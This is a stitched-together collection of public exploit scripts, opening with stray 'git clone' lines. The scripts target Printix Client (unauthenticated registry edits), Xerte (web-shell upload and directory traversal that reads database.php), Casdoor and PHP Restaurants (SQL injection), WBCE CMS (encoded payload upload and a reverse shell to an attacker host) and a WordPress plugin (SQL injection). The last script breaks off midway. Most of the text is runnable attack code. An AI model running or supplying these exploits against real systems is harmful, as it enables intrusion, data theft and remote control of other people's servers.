git clone https://github.com/Enes4xd/aev
git clone https://github.com/Enes4xd/Enes4xd.git
# Exploit Title: Printix Client 1.3.1106.0 - Remote Code Execution (RCE)
# Date: 3/1/2022
# Exploit Author: Logan Latvala
# Vendor Homepage: https://printix.net
# Software Link: https://software.printix.net/client/win/1.3.1106.0/PrintixClientWindows.zip
# Version: <= 1.3.1106.0
# Tested on: Windows 7, Windows 8, Windows 10, Windows 11
# CVE : CVE-2022-25089
# Github for project: https://github.com/ComparedArray/printix-CVE-2022-25089

using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Converters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

/**
 * ________________________________________
 *
 * Printix Vulnerability, CVE-2022-25089
 * Part of a Printix Vulnerability series
 * Author: Logan Latvala
 * Github: https://github.com/ComparedArray/printix-CVE-2022-25089
 * ________________________________________
 *
 */


namespace ConsoleApp1a
{

    public class PersistentRegistryData
    {
        public PersistentRegistryCmds cmd;

        public string path;

        public int VDIType;

        public byte[] registryData;
    }

    [JsonConverter(typeof(StringEnumConverter))]
    public enum PersistentRegistryCmds
    {
        StoreData = 1,
        DeleteSubTree,
        RestoreData
    }
    public class Session
    {
        public int commandNumber { get; set; }
        public string host { get; set; }
        public string data { get; set; }
        public string sessionName { get; set; }
        public Session(int commandSessionNumber = 0)
        {
            commandNumber = commandSessionNumber;
            switch (commandSessionNumber)
            {
                //Incase it's initiated, kill it immediately.
                case (0):
                    Environment.Exit(0x001);
                    break;

                //Incase the Ping request is sent though, get its needed data.
                case (2):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    data = "pingData";
                    sessionName = "PingerRinger";
                    break;

                //Incase the RegEdit request is sent though, get its needed data.
                case (49):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    PersistentRegistryData persistentRegistryData = new PersistentRegistryData();
                    persistentRegistryData.cmd = PersistentRegistryCmds.RestoreData;
                    persistentRegistryData.VDIType = 12; //(int)DefaultValues.VDIType;
                                                         //persistentRegistryData.path = "printix\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName";
                    Console.WriteLine("\n What Node starting from \\\\Local-Machine\\ would you like to select? \n");
                    Console.WriteLine("Example: HKEY_LOCAL_MACHINE\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName\n");
                    Console.WriteLine("You can only change values in HKEY_LOCAL_MACHINE");
                    Console.Write("Registry Node: ");
                    persistentRegistryData.path = "" + Console.ReadLine().Replace("HKEY_LOCAL_MACHINE","printix");
                    Console.WriteLine("Full Address Set To:  " + persistentRegistryData.path);

                    //persistentRegistryData.registryData = new byte[2];
                    //byte[] loader = selectDataType("Intel(R) Capability Licensing stuffidkreally", RegistryValueKind.String);

                    Console.WriteLine("\n What Data type are you using? \n1. String 2. Dword  3. Qword 4. Multi String  \n");
                    Console.Write("Type:  ");
                    int dataF = int.Parse(Console.ReadLine());
                    Console.WriteLine("Set Data to: " + dataF);

                    Console.WriteLine("\n What value is your type?  \n");
                    Console.Write("Value:  ");
                    string dataB = Console.ReadLine();
                    Console.WriteLine("Set Data to: " + dataF);

                    byte[] loader = null;
                    List<byte> byteContainer = new List<byte>();
                    //Dword = 4
                    //SET THIS NUMBER TO THE TYPE OF DATA YOU ARE USING! (CHECK ABOVE FUNCITON selectDataType()!)

                    switch (dataF)
                    {
                        case (1):

                            loader = selectDataType(dataB, RegistryValueKind.String);
                            byteContainer.Add(1);
                            break;
                        case (2):
                            loader = selectDataType(int.Parse(dataB), RegistryValueKind.DWord);
                            byteContainer.Add(4);
                            break;
                        case (3):
                            loader = selectDataType(long.Parse(dataB), RegistryValueKind.QWord);
                            byteContainer.Add(11);
                            break;
                        case (4):
                            loader = selectDataType(dataB.Split('%'), RegistryValueKind.MultiString);
                            byteContainer.Add(7);
                            break;

                    }

                    int pathHolder = 0;
                    foreach (byte bit in loader)
                    {
                        pathHolder++;
                        byteContainer.Add(bit);
                    }

                    persistentRegistryData.registryData = byteContainer.ToArray();
                    //added stuff:

                    //PersistentRegistryData data = new PersistentRegistryData();
                    //data.cmd = PersistentRegistryCmds.RestoreData;
                    //data.path = "";


                    //data.cmd
                    Console.WriteLine(JsonConvert.SerializeObject(persistentRegistryData));
                    data = JsonConvert.SerializeObject(persistentRegistryData);

                    break;
                //Custom cases, such as custom JSON Inputs and more.
                case (100):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    Console.WriteLine("\n What Data Should Be Sent?\n");
                    Console.Write("Data: ");
                    data = Console.ReadLine();
                    Console.WriteLine("Data set to: " + data);

                    Console.WriteLine("\n What Session Name Should Be Used? \n");
                    Console.Write("Session Name: ");
                    sessionName = Console.ReadLine();
                    Console.WriteLine("Session name set to: " + sessionName);
                    break;
            }


        }
        public static byte[] selectDataType(object value, RegistryValueKind format)
        {
            byte[] array = new byte[50];

            switch (format)
            {
                case RegistryValueKind.String: //1
                    array = Encoding.UTF8.GetBytes((string)value);
                    break;
                case RegistryValueKind.DWord://4
                    array = ((!(value.GetType() == typeof(int))) ? BitConverter.GetBytes((long)value) : BitConverter.GetBytes((int)value));
                    break;
                case RegistryValueKind.QWord://11
                    if (value == null)
                    {
                        value = 0L;
                    }
                    array = BitConverter.GetBytes((long)value);
                    break;
                case RegistryValueKind.MultiString://7
                    {
                        if (value == null)
                        {
                            value = new string[1] { string.Empty };
                        }
                        string[] array2 = (string[])value;
                        foreach (string s in array2)
                        {
                            byte[] bytes = Encoding.UTF8.GetBytes(s);
                            byte[] second = new byte[1] { (byte)bytes.Length };
                            array = array.Concat(second).Concat(bytes).ToArray();
                        }
                        break;
                    }
            }
            return array;
        }
    }
    class CVESUBMISSION
    {
        static void Main(string[] args)
        {
        FORCERESTART:
            try
            {

                //Edit any registry without auth:
                //Use command 49, use the code provided on the desktop...
                //This modifies it directly, so no specific username is needed. :D

                //The command parameter, a list of commands is below.
                int command = 43;

                //To force the user to input variables or not.
                bool forceCustomInput = false;

                //The data to send, this isn't flexible and should be used only for specific examples.
                //Try to keep above 4 characters if you're just shoving things into the command.
                string data = "{\"profileID\":1,\"result\":true}";

                //The username to use.
                //This is to fulfill the requriements whilst in development mode.
                DefaultValues.CurrentSessName = "printixMDNs7914";

                //The host to connect to. DEFAULT= "localhost"
                string host = "192.168.1.29";

            //                                Configuration Above

            InvalidInputLabel:
                Console.Clear();
                Console.WriteLine("Please select the certificate you want to use with port 21338.");
                //Deprecated, certificates are no longer needed to verify, as clientside only uses the self-signed certificates now.
                Console.WriteLine("Already selected, client authentication isn't needed.");

                Console.WriteLine(" /───────────────────────────\\ ");
                Console.WriteLine("\nWhat would you like to do?");
                Console.WriteLine("\n    1. Send Ping Request");
                Console.WriteLine("    2. Send Registry Edit Request");
                Console.WriteLine("    3. Send Custom Request");
                Console.WriteLine("    4. Experimental Mode (Beta)\n");
                Console.Write("I choose option # ");

                try
                {
                    switch (int.Parse(Console.ReadLine().ToLower()))
                    {
                        case (1):
                            Session session = new Session(2);

                            command = session.commandNumber;
                            host = session.host;
                            data = session.data;
                            DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);



                            break;
                        case (2):
                            Session sessionTwo = new Session(49);

                            command = sessionTwo.commandNumber;
                            host = sessionTwo.host;
                            data = sessionTwo.data;
                            DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);

                            break;
                        case (3):

                            Console.WriteLine("What command number do you want to input?");
                            command = int.Parse(Console.ReadLine().ToString());
                            Console.WriteLine("What IP would you like to use? (Default = localhost)");
                            host = Console.ReadLine();
                            Console.WriteLine("What data do you want to send? (Keep over 4 chars if you are not sure!)");
                            data = Console.ReadLine();

                            Console.WriteLine("What session name do you want to use? ");
                            DefaultValues.CurrentSessName = Console.ReadLine();
                            break;
                        case (4):
                            Console.WriteLine("Not yet implemented.");
                            break;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Invalid Input!");
                    goto InvalidInputLabel;
                }
                
                Console.WriteLine("Proof Of Concept For CVE-2022-25089 | Version: 1.3.24 | Created by Logan Latvala");
                Console.WriteLine("This is a RAW API, in which you may get unintended results from usage.\n");

                CompCommClient client = new CompCommClient();


                byte[] responseStorage = new byte[25555];
                int responseCMD = 0;
                client.Connect(host, 21338, 3, 10000);

                client.SendMessage(command, Encoding.UTF8.GetBytes(data));
                // Theory: There is always a message being sent, yet it doesn't read it, or can't intercept it.
                // Check for output multiple times, and see if this is conclusive.



                //client.SendMessage(51, Encoding.ASCII.GetBytes(data));
                new Thread(() => {
                    //Thread.Sleep(4000);
                    if (client.Connected())
                    {
                        int cam = 0;
                        // 4 itterations of loops, may be lifted in the future.
                        while (cam < 5)
                        {

                            //Reads the datastream and keeps returning results.
                            //Thread.Sleep(100);
                            try
                            {
                                try
                                {
                                    if (responseStorage?.Any() == true)
                                    {
                                        //List<byte> byo1 =  responseStorage.ToList();
                                        if (!Encoding.UTF8.GetString(responseStorage).Contains("Caption"))
                                        {
                                            foreach (char cam2 in Encoding.UTF8.GetString(responseStorage))
                                            {
                                                if (!char.IsWhiteSpace(cam2) && char.IsLetterOrDigit(cam2) || char.IsPunctuation(cam2))
                                                {
                                                    Console.Write(cam2);
                                                }
                                            }
                                        }else
                                        {
                                            
                                        }
                                    }

                                }
                                catch (Exception e) { Debug.WriteLine(e); }
                                client.Read(out responseCMD, out responseStorage);

                            }
                            catch (Exception e)
                            {
                                goto ReadException;
                            }
                            Thread.Sleep(100);
                            cam++;
                            //Console.WriteLine(cam);
                        }

                    


                    }
                    else
                    {
                        Console.WriteLine("[WARNING]: Client is Disconnected!");
                    }
                ReadException:
                    try
                    {
                        Console.WriteLine("Command Variable Response: " + responseCMD);
                        Console.WriteLine(Encoding.UTF8.GetString(responseStorage) + " || " + responseCMD);
                        client.disConnect();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("After 4.2 Seconds, there has been no response!");
                        client.disConnect();
                    }
                }).Start();

                Console.WriteLine(responseCMD);
                Console.ReadLine();

            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.ReadLine();

                //Environment.Exit(e.HResult);
            }

            goto FORCERESTART;
        }
    }
}
# Exploit Title: Xerte 3.9 - Remote Code Execution (RCE) (Authenticated)
# Date: 05/03/2021
# Exploit Author: Rik Lutz
# Vendor Homepage: https://xerte.org.uk
# Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.8.5-33.zip
# Version: up until version 3.9
# Tested on: Windows 10 XAMP
# CVE : CVE-2021-44664

# This PoC assumes guest login is enabled and the en-GB langues files are used.
# This PoC wil overwrite the existing langues file (.inc) for the englisch index page with a shell.
# Vulnerable url: https://<host>/website_code/php/import/fileupload.php
# The mediapath variable can be used to set the destination of the uploaded.
# Create new project from template -> visit "Properties" (! symbol) -> Media and Quota

import requests
import re

xerte_base_url = "http://127.0.0.1"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

with requests.Session() as session:
    # Get a PHP session ID
    if not php_session_id:
        session.get(xerte_base_url)
    else:
        session.cookies.set("PHPSESSID", php_session_id)

     # Use a default template
    data = {
        'tutorialid': 'Nottingham',
        'templatename': 'Nottingham',
        'tutorialname': 'exploit',
        'folder_id': ''
    }

    # Create a new project in order to find the install path
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

    # Find template ID
    data = {
        'template_id': re.findall('(\d+)', template_id.text)[0]
    }

    # Find the install path:
    install_path = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
    install_path = re.findall('mediapath" value="(.+?)"', install_path.text)[0]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',
        'Content-Type': 'multipart/form-data; boundary=---------------------------170331411929658976061651588978',
       }

    # index.inc file
    data = \
    '''-----------------------------170331411929658976061651588978
Content-Disposition: form-data; name="filenameuploaded"; filename="index.inc"
Content-Type: application/octet-stream

<?php
if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }
/**
 *
 * index.php english language file
 *
 * @author Patrick Lockley
 * @version 1.0
 * @copyright Pat Lockley
 * @package
 */

define("INDEX_USERNAME_AND_PASSWORD_EMPTY", "Please enter your username and password");

define("INDEX_USERNAME_EMPTY", "Please enter your username");

define("INDEX_PASSWORD_EMPTY", "Please enter your password");

define("INDEX_LDAP_MISSING", "PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");

define("INDEX_SITE_ADMIN", "Site admins should log on on the manangement page");

define("INDEX_LOGON_FAIL", "Sorry that password combination was not correct");

define("INDEX_LOGIN", "login area");

define("INDEX_USERNAME", "Username");

define("INDEX_PASSWORD", "Password");

define("INDEX_HELP_TITLE", "Getting Started");

define("INDEX_HELP_INTRODUCTION", "We\'ve produced a short introduction to the Toolkits website.");

define("INDEX_HELP_INTRO_LINK_TEXT","Show me!");

define("INDEX_NO_LDAP","PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");

define("INDEX_FOLDER_PROMPT","What would you like to call your folder?");

define("INDEX_WORKSPACE_TITLE","My Projects");

define("INDEX_CREATE","Project Templates");

define("INDEX_DETAILS","Project Details");

define("INDEX_SORT","Sort");

define("INDEX_SEARCH","Search");

define("INDEX_SORT_A","Alphabetical A-Z");

define("INDEX_SORT_Z","Alphabetical Z-A");

define("INDEX_SORT_NEW","Age (New to Old)");

define("INDEX_SORT_OLD","Age (Old to New)");

define("INDEX_LOG_OUT","Log out");

define("INDEX_LOGGED_IN_AS","Logged in as");

define("INDEX_BUTTON_LOGIN","Login");

define("INDEX_BUTTON_LOGOUT","Logout");

define("INDEX_BUTTON_PROPERTIES","Properties");

define("INDEX_BUTTON_EDIT","Edit");

define("INDEX_BUTTON_PREVIEW", "Preview");

define("INDEX_BUTTON_SORT", "Sort");

define("INDEX_BUTTON_NEWFOLDER", "New Folder");

define("INDEX_BUTTON_NEWFOLDER_CREATE", "Create");

define("INDEX_BUTTON_DELETE", "Delete");

define("INDEX_BUTTON_DUPLICATE", "Duplicate");

define("INDEX_BUTTON_PUBLISH", "Publish");

define("INDEX_BUTTON_CANCEL", "Cancel");

define("INDEX_BUTTON_SAVE", "Save");

define("INDEX_XAPI_DASHBOARD_FROM", "From:");

define("INDEX_XAPI_DASHBOARD_UNTIL", "Until:");

define("INDEX_XAPI_DASHBOARD_GROUP_SELECT", "Select group:");

define("INDEX_XAPI_DASHBOARD_GROUP_ALL", "All groups");

define("INDEX_XAPI_DASHBOARD_SHOW_NAMES", "Show names and/or email addresses");

define("INDEX_XAPI_DASHBOARD_CLOSE", "Close dashboard");

define("INDEX_XAPI_DASHBOARD_DISPLAY_OPTIONS", "Display options");

define("INDEX_XAPI_DASHBOARD_SHOW_HIDE_COLUMNS", "Show / hide columns");

define("INDEX_XAPI_DASHBOARD_QUESTION_OVERVIEW", "Interaction overview");

define("INDEX_XAPI_DASHBOARD_PRINT", "Print");
\r
\r
-----------------------------170331411929658976061651588978
Content-Disposition: form-data; name="mediapath"

''' \
    + install_path \
    + '''../../../languages/en-GB/
-----------------------------170331411929658976061651588978--\r
'''

    # Overwrite index.inc file
    response = session.post(xerte_base_url + '/website_code/php/import/fileupload.php', headers=headers, data=data)
    print('Installation path: ' + install_path)
    print(response.text)
    if "success" in response.text:
        print("Visit shell @: " + xerte_base_url + '/?cmd=whoami')
# Exploit Title: Xerte 3.10.3 - Directory Traversal (Authenticated)
# Date: 05/03/2021
# Exploit Author: Rik Lutz
# Vendor Homepage: https://xerte.org.uk
# Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.9.zip
# Version: up until 3.10.3
# Tested on: Windows 10 XAMP
# CVE : CVE-2021-44665

# This PoC assumes guest login is enabled. Vulnerable url:
# https://<host>/getfile.php?file=<user-direcotry>/../../database.php
# You can find a userfiles-directory by creating a project and browsing the media menu.
# Create new project from template -> visit "Properties" (! symbol) -> Media and Quota -> Click file to download
# The userfiles-direcotry will be noted in the URL and/or when you download a file.
# They look like: <numbers>-<username>-<templatename>

import requests
import re

xerte_base_url = "http://127.0.0.1"
file_to_grab = "/../../database.php"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

with requests.Session() as session:
    # Get a PHP session ID
    if not php_session_id:
        session.get(xerte_base_url)
    else:
        session.cookies.set("PHPSESSID", php_session_id)

    # Use a default template
    data = {
        'tutorialid': 'Nottingham',
        'templatename': 'Nottingham',
        'tutorialname': 'exploit',
        'folder_id': ''
    }

    # Create a new project in order to create a user-folder
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

    # Find template ID
    data = {
        'template_id': re.findall('(\d+)', template_id.text)[0]
    }

    # Find the created user-direcotry:
    user_direcotry = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
    user_direcotry = re.findall('USER-FILES\/([0-9]+-[a-z0-9]+-[a-zA-Z0-9_]+)', user_direcotry.text)[0]

    # Grab file
    result = session.get(xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
    print(result.text)
    print("|-- Used Variables: --|")
    print("PHP Session ID: " + session.cookies.get_dict()['PHPSESSID'])
    print("user direcotry: " + user_direcotry)
    print("Curl example:")
    print('curl --cookie "PHPSESSID=' + session.cookies.get_dict()['PHPSESSID'] + '" ' + xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
// Exploit Title: Casdoor 1.13.0 - SQL Injection (Unauthenticated)
// Date: 2022-02-25
// Exploit Author: Mayank Deshmukh
// Vendor Homepage: https://casdoor.org/
// Software Link: https://github.com/casdoor/casdoor/releases/tag/v1.13.0
// Version: version < 1.13.1
// Security Advisory: https://github.com/advisories/GHSA-m358-g4rp-533r
// Tested on: Kali Linux
// CVE : CVE-2022-24124
// Github POC: https://github.com/ColdFusionX/CVE-2022-24124

// Exploit Usage : go run exploit.go -u http://127.0.0.1:8080

package main

import (
    "flag"
    "fmt"
    "html"
    "io/ioutil"
    "net/http"
    "os"
    "regexp"
    "strings"
)

func main() {
    var url string
    flag.StringVar(&url, "u", "", "Casdoor URL (ex. http://127.0.0.1:8080)")
    flag.Parse()

    banner := `
-=Casdoor SQL Injection (CVE-2022-24124)=-
- by Mayank Deshmukh (ColdFusionX)

`
    fmt.Printf(banner)
    fmt.Println("[*] Dumping Database Version")
    response, err := http.Get(url + "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(null,version(),null)")

    if err != nil {
        panic(err)
    }

    defer response.Body.Close()

    databytes, err := ioutil.ReadAll(response.Body)

    if err != nil {
        panic(err)
    }

    content := string(databytes)

    re := regexp.MustCompile("(?i)(XPATH syntax error.*&#39)")

    result := re.FindAllString(content, -1)
    
    sqliop := fmt.Sprint(result)
    replacer := strings.NewReplacer("[", "", "]", "", "&#39", "", ";", "")
    
    finalop := replacer.Replace(sqliop)
    fmt.Println(html.UnescapeString(finalop))


    if result == nil {
        fmt.Printf("Application not vulnerable\n")
        os.Exit(1)
    }
 }
# Exploit Title: WBCE CMS 1.5.2 - Remote Code Execution (RCE) (Authenticated)
# Date: 02/01/2022
# Exploit Author: Antonio Cuomo (arkantolo)
# Vendor Homepage: https://wbce.org/
# Software Link: https://wbce.org/de/downloads/
# Version: 1.5.2
# Tested on: Linux - PHP Version: 8.0.14
# Github repo: https://github.com/WBCE/WBCE_CMS

# -*- coding: utf-8 -*-
#/usr/bin/env python

import requests
import string
import base64
import argparse
import time
import io
from bs4 import BeautifulSoup #pip install beautifulsoup4

PAYLOAD = 'UEsDBBQAAAAIAI1+n1Peb3ztBAMAAFUHAAAMAAAAdDE4YmtuZXYucGhwhVVtT9swEP6OxH8wUaQmUqAJ24epUSYh6CY0CbQC2weGIje5UKuJndkOhSH++85OQqqqtBIizr08eZ6783U8nujoy3zJ4enwAF8ODxToVLMK0pJVTHuhH7u/prOby+urxIlOQid2WZ246Wz68256c3vvSHhKWe08xG4tpN70GJvxZYuGL1PF/kESfQ7D2F1JpiGlCW/KMnZBSiHf39QCyjIZNZxWQI5pTFYxYXlMxnPGx2pBjtkodnMKleBJiCeYN494YIVXNDzTTPAUnpnSyhvVGddlWgi5HPn+q1uzPBlMnm9yrDE5jvzXWjKuUbMznc2uZxNyTvlIExPp+DE8oyfy47cuxX+1lrC11EKx51SBViz3/E04o66H62PWIXsxUfwGpQIypP4+m11dXn2fkG+UlZATLUgbyxScEHK7YIrg39+GaSCZqNBDKM8JF0icalqeOIifLXImPWeM56aiamm7qkS2TArzX9TAPWxrYFsYmG5wYR9Ky+BTaMt0ZBPWVHV+4rXxG4JAZZLVWkhVQ5ZQKemLFyZf24NTsxqcwJGOH0SbxhUaT7cYkXItRQZKJeaZWtbtrAQb3wtck6Za3kylEpRoZAZej+B/1GxV0xUnFnRdD+oEWpn+pvMSy8D4o9d+4z58CLBAOwKifQGnHwbYkhvnO9mbJjP8C7wnL8RUAHKC9wykgpa1mRBs5cS2EiWsFqwE1PBqbgeIosXcov/GZmeCc7BXiGiQFeNUQ44wcyS3jN86kEHah0BdobeiuPjIU9pORSdyKNZ7VbDhvKnSbEH5I+SpCQOtkvdClUjU67CCfqEE/S4JzC6xE8B4uv6lLsO3JWmXhz/U9/r8B5lNzy6Qrct43eikMPF97rDHEHp7+oS0iYhQWFJrk9J6cKDWaQ3Sd1O7vbi+u91GbkDYT9CCbKFo5O2kd7qfHg7ALnqnu+kNIHvpvRVZKVRnxiD7NpR50xJtWuxw2SVircNaiPsfENJTcpXG06OVfNTt6W7mnc73hztI6fBAgm4kJ2H8H1BLAQI/ABQAAAAIAI1+n1Peb3ztBAMAAFUHAAAMACQAAAAAAAAAIAAAAAAAAAB0MThia25ldi5waHAKACAAAAAAAAEAGACAuZAFVv7XAYC5kAVW/tcB6Bk8KTf+1wFQSwUGAAAAAAEAAQBeAAAALgMAAAAA'

def main():
    parser = argparse.ArgumentParser(description='WBCE <= 1.5.2 - Remote Code Execution (Authenticated)')
    parser.add_argument('-x', '--url', type=str, required=True)
    parser.add_argument('-u', '--user', type=str, required=False)
    parser.add_argument('-p', '--password', type=str, required=False)
    parser.add_argument('-ah', '--attacker_host', type=str, required=False)
    parser.add_argument('-ap', '--attacker_port', type=str, required=False)
    args = parser.parse_args()
    print("\nWBCE 1.5.2 - Remote Code Execution (Authenticated)","\nExploit Author: Antonio Cuomo (Arkantolo)\n")
    exploit(args, PAYLOAD)

def exploit(args, payload):
    s2 = requests.Session()

    #login
    body= {'url':'','username_fieldname':'username_t18bknev','password_fieldname':'password_t18bknev','username_t18bknev':args.user,'password_t18bknev':args.password}
    r = s2.post(args.url+'/admin/login/index.php', data=body, allow_redirects=False)
    if(r.status_code==302 and r.headers['location'].find('/start/') != -1):
        print("[*] Login OK")
    else:
        print("[*] Login Failed")
        exit(1)

    time.sleep(1)
    
    #create droplet
    up = {'userfile':('t18bknev.zip', io.BytesIO(base64.b64decode(PAYLOAD)), "multipart/form-data")}
    r = s2.post(args.url+'/admin/admintools/tool.php?tool=droplets&upload=1', files=up)
    if(r.status_code==200 and r.text.find('1 Droplet(s) imported') != -1):
        print("[*] Droplet OK")
    else:
        print("[*] Exploit Failed")
        exit(1)

    time.sleep(1)
    
    #get csrf token
    r = s2.get(args.url+'/admin/pages/index.php')
    soup = BeautifulSoup(r.text, 'html.parser')
    formtoken = soup.find('input', {'name':'formtoken'})['value']
    
    #create page
    body= {'formtoken':formtoken,'title':'t18bknev','type':'wysiwyg','parent':'0','visibility':'public','save':''}
    r = s2.post(args.url+'/admin/pages/add.php', data=body, allow_redirects=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    try:
        page_id = soup.findAll("script")[9].string.split("location.href='")[-1].split("\");")[0].split("'")[0].split("=")[1]
        print("[*] Page OK ["+page_id+"]")
    except:
        print("[*] Exploit Failed")
        exit(1)
    
    time.sleep(1)
    
    #get csrf token
    print("[*] Getting token")
    r = s2.get(args.url+'/admin/pages/modify.php?page_id='+page_id)
    soup = BeautifulSoup(r.text, 'html.parser')
    formtoken = soup.find('input', {'name':'formtoken'})['value']
    section_id = soup.find('input', {'name':'section_id'})['value']
        
    time.sleep(1)
    
    #add droplet to page
    body= {'page_id':page_id,'formtoken':formtoken,'section_id':section_id,'content'+section_id:'[[t18bknev]]','modify':'save'}
    r = s2.post(args.url+'/modules/wysiwyg/save.php', data=body, allow_redirects=False)
    if(r.status_code==200 and r.text.find('Page saved') != -1):
        print("[*] Adding droplet OK")
    else:
        print("[*] Exploit Failed")
        exit(1)   
    
    time.sleep(1)
    
    input("Please make sure that your nc listner is ready...\n\nPRESS ENTER WHEN READY")
    body= {'rev_ip':args.attacker_host,'rev_port':args.attacker_port}
    r = s2.post(args.url+'/pages/t18bknev.php', data=body, allow_redirects=False)
    if(r.status_code==200):
        print("[*] Exploit OK - check your listner")
        exit(0)
    else:
        print("[*] Exploit Failed")
        exit(1)

if __name__ == '__main__':
    main()
# Exploit Title: PHP Restaurants 1.0 - SQLi (Unauthenticated)
# Google Dork: None
# Date: 01/29/2022
# Exploit Author: Nefrit ID
# Vendor Homepage: https://github.com/jcwebhole
# Software Link: https://github.com/jcwebhole/php_restaurants
# Version: 1.0
# Tested on: Kali Linux & Windows 10

*SQL injection is a code injection technique used to attack
data-driven applications, in which malicious SQL statements are
inserted into an entry field for execution (e.g. to dump the database
contents to the attacker). wikipedia*


===Start===
Exploit Url = http://localhost/php_restaurants-master/admin/functions.php?f=deleteRestaurant&id=1337
AND (SELECT 3952 FROM (SELECT(SLEEP(5)))XMSid)

Burpsuite Proxy Intercept
GET /php_restaurants-master/admin/functions.php?f=deleteRestaurant&id=1337
HTTP/1.1
Host: web_server_ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69
Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://web_server_ip/php_restaurants-master/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: uid=1
Connection: close
# Exploit Title: Wordpress Plugin Download Monitor WordPress V 4.4.4 - SQL Injection (Authenticated)
# Date 28.01.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.download-monitor.com/
# Software Link: https://downloads.wordpress.org/plugin/download-monitor.4.4.4.zip
# Version: < 4.4.5
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-24786
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24786/README.md

'''
Description:
The Download Monitor WordPress plugin before 4.4.5 does not properly validate and escape the "orderby" GET parameter
before using it in a SQL statement when viewing the logs, leading to an SQL Injection issue
'''

# Banner:
banner = '''

   ___         __    ____   ___ ____  _      ____  _  _ _____ ___   __   
  / __\/\   /\/__\  |___ \ / _ \___ \/ |    |___ \| || |___  ( _ ) / /_ 
 / /   \ \ / /_\_____ __) | | | |__) | |_____ __) | || |_ / // _ \| '_ \
/ /___  \ V //_|_____/ __/| |_| / __/| |_____/ __/|__   _/ /| (_) | (_) |
\____/   \_/\__/    |_____|\___/_____|_|    |_____|  |_|/_/  \___/ \___/
                                                                        
                                  [+] Download Monitor - SQL-Injection
                                  [@] Developed by Ron Jost (Hacker5preme)
'''
print(banner)

import argparse
import requests
from datetime import datetime

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin RegistrationMagic - SQL Injection')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD

print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# Exploit (WORKS ONLY IF ONE LOG EXISTS)
print('')
print ('[i] If the exploit does not work, log into wp-admin and add a file and download it to create a log')
print('')
# Generate payload for SQL-Injection
sql_injection_code = input('[+] SQL-INJECTION COMMAND: ')
